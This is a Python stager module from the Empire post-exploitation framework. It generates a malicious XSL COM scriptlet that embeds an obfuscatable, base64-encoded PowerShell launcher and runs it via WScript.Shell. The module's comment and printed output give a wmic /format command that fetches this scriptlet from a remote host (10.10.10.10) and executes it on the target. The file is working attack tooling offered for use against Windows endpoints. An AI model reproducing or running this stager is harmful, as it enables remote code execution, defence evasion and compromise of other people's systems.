from lib.common import helpers
from termcolor import colored

class Stager:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'wmic',

            'Author': ['@CyberVaca'],

            'Description': ('Generates an xsl file (COM Scriptlet) Host this anywhere'),

            'Comments': [
                'On the endpoint simply launch wmic process get brief /format:"http://10.10.10.10/launcher.xsl"'
            ]
        }

        # any options needed by the stager, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Listener': {
                'Description':   'Listener to generate stager for.',
                'Required':   True,
                'Value':   ''
            },
            'Language' : {
                'Description'   :   'Language of the stager to generate.',
                'Required'      :   True,
                'Value'         :   'powershell'
            },
            'StagerRetries': {
                'Description':   'Times for the stager to retry connecting.',
                'Required':   False,
                'Value':   '0'
            },
            'Base64' : {
                'Description'   :   'Switch. Base64 encode the output.',
                'Required'      :   True,
                'Value'         :   'True'
            },
            'Obfuscate' : {
                'Description'   :   'Switch. Obfuscate the launcher powershell code, uses the ObfuscateCommand for obfuscation types. For powershell only.',
                'Required'      :   False,
                'Value'         :   'False'
            },
            'ObfuscateCommand' : {
                'Description'   :   'The Invoke-Obfuscation command to use. Only used if Obfuscate switch is True. For powershell only.',
                'Required'      :   False,
                'Value'         :   r'Token\All\1,Launcher\STDIN++\12467'
            },
            'OutFile': {
                'Description':   'File to output XSL to, otherwise displayed on the screen.',
                'Required':   False,
                'Value':   '/tmp/launcher.xsl'
            },
            'UserAgent': {
                'Description':   'User-agent string to use for the staging request (default, none, or other).',
                'Required':   False,
                'Value':   'default'
            },
            'Proxy': {
                'Description':   'Proxy to use for request (default, none, or other).',
                'Required':   False,
                'Value':   'default'
            },
            'ProxyCreds': {
                'Description':   'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
                'Required':   False,
                'Value':   'default'
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value

    def generate(self):

        # extract all of our options
        language = self.options['Language']['Value']
        listenerName = self.options['Listener']['Value']
        base64 = self.options['Base64']['Value']
        obfuscate = self.options['Obfuscate']['Value']
        obfuscateCommand = self.options['ObfuscateCommand']['Value']
        userAgent = self.options['UserAgent']['Value']
        proxy = self.options['Proxy']['Value']
        proxyCreds = self.options['ProxyCreds']['Value']
        stagerRetries = self.options['StagerRetries']['Value']

        encode = False
        if base64.lower() == "true":
            encode = True
            
        obfuscateScript = False
        if obfuscate.lower() == "true":
            obfuscateScript = True

        # generate the launcher code
        launcher = self.mainMenu.stagers.generate_launcher(
            listenerName, language=language, encode=encode, obfuscate=obfuscateScript, obfuscationCommand=obfuscateCommand, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, stagerRetries=stagerRetries)

        if launcher == "":
            print helpers.color("[!] Error in launcher command generation.")
            return ""
        else:
            code = """<?xml version='1.0'?>
                                      <stylesheet
                                      xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt"
                                      xmlns:user="placeholder"
                                      version="1.0">
                                      <output method="text"/>
                                      <ms:script implements-prefix="user" language="JScript">
                                      <![CDATA[ \n"""
            code += "                 var r = new ActiveXObject(\"WScript.Shell\").Run('" + launcher.replace("'", "\\'") + "');\n"
            code += """            ]]></ms:script>
                                   </stylesheet>"""
            command = """\n[+] wmic process get brief /format:"http://10.10.10.10/launcher.xsl" """                       
            print colored(command, 'green', attrs=['bold'])                       
        return code
